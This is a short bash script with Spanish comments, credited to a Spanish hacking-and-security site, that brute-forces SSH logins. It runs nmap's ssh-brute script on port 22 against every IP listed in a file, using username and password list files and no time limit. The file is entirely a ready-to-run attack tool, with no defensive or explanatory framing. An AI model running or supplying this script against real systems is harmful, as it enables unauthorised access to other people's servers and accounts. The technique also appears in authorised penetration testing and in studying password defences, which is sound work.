#!/bin/bash
# (c) Hacking y Seguridad .com 2022
# Fuerza bruta SSH, de listado de IPs desde fichero ip.txt
nmap -iL ip.txt -Pn $1 -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves.txt,unpwdb.timelimit=0
